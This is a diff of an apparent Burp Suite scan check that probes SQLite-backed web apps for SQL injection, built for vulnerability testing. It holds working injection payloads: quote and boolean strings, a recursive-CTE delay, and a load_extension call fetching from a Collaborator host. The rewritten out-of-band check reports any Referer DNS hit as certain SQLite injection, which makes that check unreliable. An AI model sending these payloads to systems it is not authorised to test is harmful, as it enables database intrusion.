@@ -1,64 +1,28 @@
-# SQLite SQL Injection Detection
-# Tests error-based, boolean-based, time-based, and OOB SQLi
+metadata:
+    language: v2-beta
+    name: "SQLite SQL Injection Detection"
+    description: "Error-based, boolean-blind and Collaborator OOB checks for SQLite."
+    author: "You"
 
-given insertion_point: "request"
+define:
+    payload_err = "'"
+    payload_true = "' AND 1=1--"
+    payload_false = "' AND 1=2--"
 
-# Extract baseline response
-extract original_body from response.body
-extract original_status from response.status
-extract original_time from response.time
+given insertion point then
 
-# 1. Error-Based: Trigger SQLite syntax error
-send request:
-  replace insertion_point with insertion_point + "'"
-if regex `SQLITE_ERROR.*syntax error|near.*syntax error` in response.body then
-  report issue:
-    severity: high
-    confidence: certain
-    name: "SQLite SQL Injection (Error-Based)"
-    detail: "SQLite error detected with payload: {insertion_point + '''}. Response: {regex `SQLITE_ERROR.*syntax error|near.*syntax error`}"
-    remediation: "Use parameterized queries or prepared statements."
-end if
+    send payload: appending: {payload_err}
+    if {latest.response} matches "(?i)sqlite3::exception|sqlite3 error|near \".*\": syntax error|malformed" then
+        report issue: name: "SQLite SQL Injection (Error-Based)" severity: high confidence: certain remediation: "Use parameter binding and avoid string concatenation." detail: "SQLite error text observed after appending a quote; possible error-based SQLi."
+    end if
 
-# 2. Boolean-Based Blind: Check response content change
-send request:
-  replace insertion_point with insertion_point + "' AND 1=1--"
-extract true_response from response.body
+    send payload called true_check: appending: {payload_true}
+    send payload called false_check: appending: {payload_false}
+    if {true_check.response} differs from {false_check.response} then
+        report issue: name: "SQLite SQL Injection (Boolean-Based)" severity: high confidence: firm remediation: "Use parameter binding and input validation." detail: "Responses differ between boolean true and false payloads; possible boolean blind SQLi."
+    end if
 
-send request:
-  replace insertion_point with insertion_point + "' AND 1=2--"
-extract false_response from response.body
-
-if true_response != false_response and true_response == original_body then
-  report issue:
-    severity: high
-    confidence: firm
-    name: "SQLite SQL Injection (Boolean-Based Blind)"
-    detail: "Response changed between true (1=1) and false (1=2) conditions. True payload: {insertion_point + ''' AND 1=1--'}"
-    remediation: "Sanitize inputs and use parameterized queries."
-end if
-
-# 3. Time-Based Blind: Use recursive CTE for delay
-send request:
-  replace insertion_point with insertion_point + "' AND (WITH RECURSIVE cnt(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM cnt LIMIT 1000000) SELECT 1)--"
-  set timeout to 10 seconds
-if response.time > original_time + 5000 then
-  report issue:
-    severity: high
-    confidence: tentative
-    name: "SQLite SQL Injection (Time-Based Blind)"
-    detail: "Response delayed by {response.time - original_time}ms with payload: {insertion_point + ''' AND (WITH RECURSIVE cnt(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM cnt LIMIT 1000000) SELECT 1)--'}"
-    remediation: "Use prepared statements to prevent injection."
-end if
-
-# 4. Out-of-Band: HTTP via app-specific logging
-send request:
-  replace insertion_point with insertion_point + "'; SELECT load_extension('http://test.' || collaborator_address || '/sqlite');--"
-if http interactions then
-  report issue:
-    severity: high
-    confidence: certain
-    name: "SQLite SQL Injection (Out-of-Band)"
-    detail: "HTTP interaction detected via Collaborator with payload: {insertion_point + '''; SELECT load_extension('http://test.' || collaborator_address || '/sqlite');--'}"
-    remediation: "Disable load_extension and implement strict input validation."
-end if
+    send request called collab_check: method: "GET" headers: "Referer": {generate_collaborator_address()} path: "/"
+    if dns interactions then
+        report issue: name: "SQLite SQL Injection (Out-of-Band)" severity: high confidence: certain remediation: "Avoid using untrusted input in code that triggers external network calls." detail: "Burp Collaborator observed DNS interactions after sending a request containing the collaborator address; OOB injection possible."
+    end if
